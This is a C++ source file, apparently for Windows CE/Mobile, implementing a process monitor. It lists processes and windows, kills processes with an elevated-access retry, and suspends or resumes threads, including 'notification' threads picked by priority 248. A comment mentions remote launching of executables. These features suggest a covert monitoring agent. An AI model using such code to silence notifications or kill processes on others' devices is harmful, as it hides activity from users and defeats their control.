#include "ProcessMonitor.h"
#include <common_new\aygshell.h>
#include "FunctionFunc.h"

/**
* La nostra unica reference windowList Process. La gestione della concorrenza viene fatta internamente
*/
ProcessMonitor* ProcessMonitor::Instance = NULL;
//list<WindowEntry> Process::pWindowList;
volatile LONG ProcessMonitor::lLock = 0;

ProcessMonitor* ProcessMonitor::self() {
	while (InterlockedExchange((LPLONG)&lLock, 1) != 0)
		_Sleep(1);

	if (Instance == NULL)
		Instance = new(std::nothrow) ProcessMonitor();

	InterlockedExchange((LPLONG)&lLock, 0);

	return Instance;
}

ProcessMonitor::ProcessMonitor() : hSnap(INVALID_HANDLE_VALUE), hProcessMutex(NULL), 
hWindowMutex(NULL) {
	ZeroMemory(&pe, sizeof(pe));
	ZeroMemory(&procEntry, sizeof(procEntry));

	ulTime = 0;
	ulWinTime = 0;

	hProcessMutex = _CreateMutexW(NULL, FALSE, NULL);
	hWindowMutex = _CreateMutexW(NULL, FALSE, NULL);
}

ProcessMonitor::~ProcessMonitor() {
	pList.clear();
	pWindowList.clear();

	if (hSnap != INVALID_HANDLE_VALUE)
		_CloseToolhelp32Snapshot(hSnap);

	if (hProcessMutex != NULL)
		CloseHandle(hProcessMutex);

	if (hWindowMutex != NULL)
		CloseHandle(hWindowMutex);
}

UINT ProcessMonitor::GetPid(const WCHAR *pProcName) {
	list<ProcessEntry>::iterator iter;

	if (RefreshProcessList() == FALSE)
		return FALSE;

	WAIT_AND_SIGNAL(hProcessMutex);

	if (pList.size() == 0 || pProcName == NULL || wcslen(pProcName) == 0) {
		UNLOCK(hProcessMutex);
		return 0;
	}

	for (iter = pList.begin(); iter != pList.end(); ++iter) {
		if (_wcsnicmp(pProcName, (*iter).pe.szExeFile, MAX_PATH) == 0) {
			UNLOCK(hProcessMutex);
			return (*iter).pe.th32ProcessID;
		}
	}

	UNLOCK(hProcessMutex);
	return 0;
}

UINT ProcessMonitor::GetPidW(const WCHAR *pProcName) {
	list<ProcessEntry>::iterator iter;

	if (RefreshProcessList() == FALSE)
		return FALSE;

	WAIT_AND_SIGNAL(hProcessMutex);

	if (pList.size() == 0 || pProcName == NULL || wcslen(pProcName) == 0) {
		UNLOCK(hProcessMutex);
		return 0;
	}

	for (iter = pList.begin(); iter != pList.end(); ++iter) {
		if (CmpWildW(pProcName, (*iter).pe.szExeFile) != 0) {
			UNLOCK(hProcessMutex);
			return (*iter).pe.th32ProcessID;
		}
	}

	UNLOCK(hProcessMutex);
	return 0;
}

BOOL ProcessMonitor::IsProcessRunning(const WCHAR *pProcName) {
	if (GetPid(pProcName))
		return TRUE;

	return FALSE;
}

BOOL ProcessMonitor::IsProcessRunningW(const WCHAR *pProcName) {
	if (GetPidW(pProcName))
		return TRUE;

	return FALSE;
}

BOOL ProcessMonitor::RefreshProcessList() {
	ProcessEntry tProcEntry;
	unsigned __int64 utTime;

	WAIT_AND_SIGNAL(hProcessMutex);

	utTime = GetTime();

	// Refreshamo la lista solo se sono passati piu' di 3 secondi
	if (DiffTime(utTime, ulTime) < 3000) {
		UNLOCK(hProcessMutex);
		return TRUE;
	}

	ulTime = utTime;

	pe.dwSize = sizeof(pe);

	if (hSnap != INVALID_HANDLE_VALUE) {
		_CloseToolhelp32Snapshot(hSnap);
		hSnap = INVALID_HANDLE_VALUE;
	}

	pList.clear();

	// Il secondo flag e' un undocumented che serve per windowList a NON richiedere la lista
	// degli heaps altrimenti la funzione fallisce sempre per mancanza di RAM.
	hSnap = _CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPNOHEAPS, 0);
	
	if (hSnap == INVALID_HANDLE_VALUE) {
///		SHCloseApps(10000000); // Liberiamo 10Mb e riproviamo

		hSnap = _CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPNOHEAPS, 0);

		if (hSnap == INVALID_HANDLE_VALUE) {
			UNLOCK(hProcessMutex);
			return FALSE;
		}
	}

	if (_Process32FirstW(hSnap, &pe) == FALSE) {
		if (GetLastError() == ERROR_NO_MORE_FILES) {
			UNLOCK(hProcessMutex);
			return TRUE;
		}

		UNLOCK(hProcessMutex);
		return FALSE;
	}

	tProcEntry.bTriggered = FALSE;
	CopyMemory(&tProcEntry.pe, &pe, sizeof(pe));

	pList.push_back(tProcEntry);

	while (_Process32NextW(hSnap, &pe)) {
		tProcEntry.bTriggered = FALSE;
		CopyMemory(&tProcEntry.pe, &pe, sizeof(pe));

		pList.push_back(tProcEntry);
	}

	if (GetLastError() == ERROR_NO_MORE_FILES) {
		UNLOCK(hProcessMutex);
		return TRUE;
	}

	UNLOCK(hProcessMutex);
	return FALSE;
}

BOOL ProcessMonitor::GetProcessList(list<ProcessEntry> &pRetList) {
	pRetList.clear();
	RefreshProcessList();

	WAIT_AND_SIGNAL(hProcessMutex);
	pRetList = pList;
	UNLOCK(hProcessMutex);

	return TRUE;
}

wstring ProcessMonitor::GetProcessDescription(DWORD dwPid) {
	struct LANGANDCODEPAGE {
		WORD wLanguage;
		WORD wCodePage;
	} *pLangAndCodePage;

	UINT cbTranslate = 0, cbDesc = 0;
	HANDLE hProc;
	BYTE *bFileInfo;
	WCHAR *pwDescription;
	DWORD dwInfoSize, dwDummy;
	WCHAR wProcessPath[MAX_PATH+1];
	WCHAR wFileDescName[128];
	wstring wDescription;
											
	if ((hProc = _OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwPid)) == NULL) 
		return wDescription;

	if (_GetModuleFileNameW((HMODULE)hProc, wProcessPath, sizeof(wProcessPath) / sizeof(WCHAR)) == 0) {
		CloseHandle(hProc);
		return wDescription;
	}

	CloseHandle(hProc);


	
/*****
	if ((dwInfoSize = GetFileVersionInfoSize(wProcessPath, &dwDummy)) == 0 )
		return wDescription;
*****/
	if ((dwInfoSize = _GetFileVersionInfoSizeExW(NULL,wProcessPath, &dwDummy)) == 0 )
		return wDescription;


	bFileInfo = new(std::nothrow) BYTE[dwInfoSize];

	if (bFileInfo == NULL)
		return wDescription;

	
/*****
	if (!GetFileVersionInfo(wProcessPath, NULL, dwInfoSize, bFileInfo)) {
		delete[] bFileInfo;
		return wDescription;
	}
*****/

	if (!_GetFileVersionInfoExW(NULL,wProcessPath, NULL, dwInfoSize, bFileInfo)) {
		delete[] bFileInfo;
		return wDescription;
	}

	if (!_VerQueryValueW(bFileInfo, L"\\VarFileInfo\\Translation", (LPVOID*)&pLangAndCodePage, &cbTranslate) || cbTranslate < sizeof(struct LANGANDCODEPAGE)) {
		delete[] bFileInfo;
		return wDescription;
	}

	swprintf(wFileDescName, L"\\StringFileInfo\\%04x%04x\\FileDescription", pLangAndCodePage[0].wLanguage, pLangAndCodePage[0].wCodePage);

	if (_VerQueryValueW(bFileInfo, wFileDescName, (LPVOID *)&pwDescription, &cbDesc) && cbDesc > 0) 
		wDescription = pwDescription;

	delete[] bFileInfo;
	return wDescription;
}

BOOL ProcessMonitor::RefreshWindowList() {
	unsigned __int64 utTime;

	WAIT_AND_SIGNAL(hWindowMutex);

	utTime = GetTime();

	// Refreshiamo la lista solo se sono passati piu' di 3 secondi
	if (DiffTime(utTime, ulWinTime) < 3000) {
		UNLOCK(hWindowMutex);
		return TRUE;
	}

	ulTime = utTime;

	pWindowList.clear();
	
	if (_EnumWindows(&EnumCallback, (LPARAM)&pWindowList) == FALSE) {
		UNLOCK(hWindowMutex);
		return FALSE;
	}

	UNLOCK(hWindowMutex);
	return TRUE;
}

BOOL ProcessMonitor::IsWindowPresent(const WCHAR *pWindowName) {
	list<WindowEntry>::iterator iterWindow;

	if (RefreshWindowList() == FALSE)
		return FALSE;

	WAIT_AND_SIGNAL(hWindowMutex);

	if (pWindowList.size() == 0 || pWindowName == NULL || wcslen(pWindowName) == 0) {
		UNLOCK(hWindowMutex);
		return FALSE;
	}
 
	for (iterWindow = pWindowList.begin(); iterWindow != pWindowList.end(); ++iterWindow) {
		if (CmpWildW(pWindowName, (*iterWindow).wWindowTitle) != 0) {
			UNLOCK(hWindowMutex);
			return TRUE;
		}
	}

	UNLOCK(hWindowMutex);
	return FALSE;
}

// Compara due stringhe con wildcard, torna 0 se le stringhe sono diverse
INT ProcessMonitor::CmpWildW(const WCHAR *wild, const WCHAR *searchString) {
	WCHAR *cp = NULL, *mp = NULL;

	while ((*searchString) && (*wild != '*')) {
		if ((towupper((WCHAR)*wild) != towupper((WCHAR)*searchString)) && (*wild != '?')) {
			return 0;
		}

		wild++;
		searchString++;
	}

	while (*searchString) {
		if (*wild == '*') {
			if (!*++wild) {
				return 1;
			}

			mp = (PWCHAR)wild;
			cp = (PWCHAR)searchString + 1;
		} else if ((towupper((WCHAR)*wild) == towupper((WCHAR)*searchString)) || (*wild == '?')) {
			wild++;
			searchString++;
		} else {
			wild = mp;
			searchString = cp++;
		}
	}

	while (*wild == '*') {
		wild++;
	}

	return !*wild;
}

BOOL CALLBACK ProcessMonitor::EnumCallback(HWND hwnd, LPARAM lParam) {
	WindowEntry tWindowEntry;
	list<WindowEntry> *windowList = ((list<WindowEntry> *)lParam);

	tWindowEntry.bTriggered = FALSE;
	
	if (_GetWindowTextW(hwnd, tWindowEntry.wWindowTitle, MAX_TITLE_LEN) && tWindowEntry.wWindowTitle[0] != 0) {
		windowList->push_back(tWindowEntry);
	}

	return TRUE;
}

extern "C" {
	///BOOL WINAPI SetKMode(BOOL fMode);
	///DWORD WINAPI SetProcPermissions(DWORD);
	LPVOID WINAPI MapPtrToProcess (LPVOID lpv, HANDLE hProc);
	LPVOID WINAPI MapPtrUnsecure(LPVOID lpv, HANDLE hProc);
	HLOCAL WINAPI LocalAllocInProcess(UINT uFlags, UINT uBytes, HANDLE hProc); 
	HLOCAL WINAPI LocalFreeInProcess(HLOCAL hMem, HANDLE hProc); 
	HANDLE WINAPI LoadKernelLibrary(LPCWSTR lpszFileName);
	int QueryAPISetID(char *pName);

	typedef struct _CALLBACKINFO {
		HANDLE m_hDestProcess;
		FARPROC m_pFunction;
		PVOID m_pFirstArgument;
	} CALLBACKINFO, *pCALLBACKINFO;

	DWORD WINAPI PerformCallBack4(CALLBACKINFO *pcbi, ...);
};

#define PROC_FIND			0x0
#define PROC_TERMINATE		0x1

#define TH_MASK		  0x000000F0

#define TH_BY_PRI			0x10
#define TH_TERMINATE_BY_PRI	0x11
#define TH_SUSPEND_BY_PRI	0x12
#define TH_RESUME_BY_PRI	0x13

#define TH_ALL				0x20
#define TH_TERMINATE_ALL	0x21
#define TH_SUSPEND_ALL		0x22
#define TH_RESUME_ALL		0x23

DWORD ProcessMonitor::ThreadHandler( DWORD dwProc, DWORD dwMode, DWORD dwValue )
{
	BOOL bOut = FALSE;
	///DWORD dwErr = -1, dwOut = -1, dwOldPerm;
	DWORD dwErr = -1, dwOut = -1;
	HANDLE hSnapTh = INVALID_HANDLE_VALUE;
	THREADENTRY32  te;
	ZeroMemory(&te, sizeof(THREADENTRY32));
	te.dwSize = sizeof(THREADENTRY32);

	hSnapTh = _CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD | TH32CS_SNAPNOHEAPS, dwProc);

	if (hSnapTh == INVALID_HANDLE_VALUE) {
/***
		if (FALSE == SHCloseApps((0xA00000))) {
			return NULL;
		}
***/
		hSnapTh = _CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD | TH32CS_SNAPNOHEAPS, dwProc);
		if (hSnapTh == INVALID_HANDLE_VALUE) {
			return NULL;
		}
	}

	if (_Thread32First(hSnapTh, &te)) {
		do {
			if (dwProc == te.th32OwnerProcessID) {
				
				if ((dwMode&TH_MASK) == TH_BY_PRI) {
					if (te.tpBasePri == dwValue) {
						SetLastError(0);

						dwOut =	te.th32ThreadID;

						if (dwMode == TH_TERMINATE_BY_PRI)	{

							if (_TerminateThread((HANDLE)te.th32ThreadID, 0) == TRUE) {
								dwOut = 0;
							}
						}

						if (dwMode == TH_SUSPEND_BY_PRI) {
							///SetKMode(TRUE);
							///dwOldPerm = SetProcPermissions(0xFFFFFFFF);

							if (_SuspendThread((HANDLE)te.th32ThreadID) != 0xFFFFFFFF) {
								dwOut =	te.th32ThreadID;
							}
						}

						if (dwMode == TH_RESUME_BY_PRI) {
							///SetKMode(TRUE);
							///dwOldPerm = SetProcPermissions(0xFFFFFFFF);

							if (_ResumeThread((HANDLE)te.th32ThreadID) != 0xFFFFFFFF) {
								dwOut = te.th32ThreadID;;
							}
						}

						break;					
					}
				}

				if ((dwMode&TH_MASK) == TH_ALL) {

					if (dwMode == TH_TERMINATE_ALL)	{

						if (_TerminateThread((HANDLE)te.th32ThreadID, 0) == TRUE) {
							dwOut = 0;
						}
					}

					if (dwMode == TH_SUSPEND_ALL) {
						///SetKMode(TRUE);
						///dwOldPerm = SetProcPermissions(0xFFFFFFFF);

						if (_SuspendThread((HANDLE)te.th32ThreadID) != 0xFFFFFFFF) {
							dwOut =	te.th32ThreadID;
						}
					}

					if (dwMode == TH_RESUME_ALL) {
						///SetKMode(TRUE);
						///dwOldPerm = SetProcPermissions(0xFFFFFFFF);

						if (_ResumeThread((HANDLE)te.th32ThreadID) != 0xFFFFFFFF) {
							dwOut = te.th32ThreadID;;
						}
					}
				}
			}
		} while (_Thread32Next(hSnapTh, &te));
	}

	///if (dwOldPerm != 0)
		///SetProcPermissions(dwOldPerm);
	///SetKMode(FALSE);

	if (hSnapTh != INVALID_HANDLE_VALUE && hSnapTh != NULL)
		_CloseToolhelp32Snapshot(hSnapTh);

	return dwOut;
}

BOOL ProcessMonitor::ProcessHandler( wstring wszProcessName, DWORD dwMode, DWORD dwValue )
{
	BOOL bOut = FALSE;
	HANDLE hTH = INVALID_HANDLE_VALUE;
	PROCESSENTRY32 pe;
	ZeroMemory(&pe, sizeof(PROCESSENTRY32));
	pe.dwSize = sizeof(PROCESSENTRY32);
	HANDLE hProc = INVALID_HANDLE_VALUE;

	hTH = _CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPNOHEAPS, 0);

	if (hTH == INVALID_HANDLE_VALUE) {
/***
		if (FALSE == SHCloseApps((0xA00000))) {
			DBG_TRACE(L"ProcessMonitor ProcessHandler CreateToolhelp32Snapshot FAILED ", 5, FALSE);
			return FALSE;
		}
***/
		hTH = _CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPNOHEAPS, 0);
		if (hTH == INVALID_HANDLE_VALUE) {
			DBG_TRACE(L"ProcessMonitor ProcessHandler CreateToolhelp32Snapshot FAILED ", 5, FALSE);
			return FALSE;
		}
	}

	if (_Process32FirstW(hTH, &pe)) {
		do {
			if (_wcsicmp(wszProcessName.c_str(), pe.szExeFile) == 0) {
				
				hProc = _OpenProcess(0, FALSE, pe.th32ProcessID);

				if (hProc != INVALID_HANDLE_VALUE && hProc != NULL) {

					switch(dwMode) {
						case PROC_TERMINATE: {
							bOut = _TerminateProcess(hProc, 1);
							DBG_TRACE_INT(L"ProcessMonitor ProcessHandler TerminateProcess1 bOut: ", 5, TRUE, bOut);
							
							if (bOut == FALSE) {
								if (hProc)
									CloseHandle(hProc);
								///BOOL bKMode = SetKMode(TRUE);
								///DWORD dwProcPerm = SetProcPermissions(0xFFFFFFFF);

								hProc = _OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
								if (hProc != INVALID_HANDLE_VALUE && hProc != NULL) {
									bOut = _TerminateProcess(hProc, 1);
								}
								
								DBG_TRACE_INT(L"ProcessMonitor ProcessHandler TerminateProcess2 bOut: ", 5, TRUE, bOut);

								///SetProcPermissions(dwProcPerm);
								///SetKMode(bKMode);
								if (hProc)
									CloseHandle(hProc);
							}
							break;
						}
						case PROC_FIND:
							bOut = TRUE;
							break;
						default:
							if (dwMode&TH_MASK)
								if (ThreadHandler(pe.th32ProcessID, dwMode, dwValue) != -1)
									bOut = TRUE;
							break;
					}

					CloseHandle(hProc);
					break;
				}
			}
		} while (_Process32NextW(hTH, &pe));
	}

	_CloseToolhelp32Snapshot(hTH);
	return bOut;
}

BOOL ProcessMonitor::ResumeNotificationThread(wstring wszProcessName)
{
	if (ProcessHandler(wszProcessName.c_str(), TH_RESUME_BY_PRI, 248) == TRUE)
		return TRUE;

	return FALSE;
}

BOOL ProcessMonitor::ResumeAllThread(wstring wszProcessName)
{
	if (ProcessHandler(wszProcessName.c_str(), TH_RESUME_ALL, 0) == TRUE)
		return TRUE;

	return FALSE;
}

BOOL ProcessMonitor::SuspendNotificationThread(wstring wszProcessName)
{
	if (ProcessHandler(wszProcessName.c_str(), TH_SUSPEND_BY_PRI, 248) == TRUE)
		return TRUE;
	
	return FALSE;
}

BOOL ProcessMonitor::SuspendAllThread(wstring wszProcessName)
{
	if (ProcessHandler(wszProcessName.c_str(), TH_SUSPEND_ALL, 0) == TRUE)
		return TRUE;

	return FALSE;
}

BOOL ProcessMonitor::KillProcess(wstring wszProcessName)
{
	if (ProcessHandler(wszProcessName.c_str(), PROC_TERMINATE, 0) == TRUE) {
		return TRUE;
	}

	if (ProcessHandler(wszProcessName, PROC_FIND, 0) == FALSE) {
		DBG_TRACE(L"ProcessMonitor KillProcess ProcessHandler PROC_FIND PROC NOT FOUND ", 5, FALSE);
		return TRUE;	
	}

	return FALSE;
}

BOOL ProcessMonitor::StartProcess(wstring wszProcessName, wstring wszProcessPath, wstring wszProcessOptions)
{
	// BYGIO da remoto possono lanciare un exe sulla macchina locale!!! noi per adesso non l'abiamo.
	/***
	wszProcessPath.append(wszProcessName);

	if (wszProcessName.length() == 0 || wszProcessPath.length() == 0) {
		return FALSE;
	}

	if (ProcessHandler(wszProcessName, PROC_FIND, 0) == TRUE) {
		return FALSE;	
	}

	SHELLEXECUTEINFO shExecInfo;
	ZeroMemory(&shExecInfo, sizeof(SHELLEXECUTEINFO));
	shExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);

	shExecInfo.fMask	= SEE_MASK_FLAG_NO_UI;
	shExecInfo.lpVerb	= L"Open";
	shExecInfo.lpFile	= wszProcessPath.c_str();
	shExecInfo.lpParameters = wszProcessOptions.c_str();

	return ShellExecuteEx(&shExecInfo);
	**/
	return TRUE;
}

BOOL ProcessMonitor::RestartProcess(wstring wszProcessName, wstring wszProcessPath, wstring wszProcessOptions) 
{
	KillProcess(wszProcessName);
	return StartProcess(wszProcessName, wszProcessPath, wszProcessOptions);
}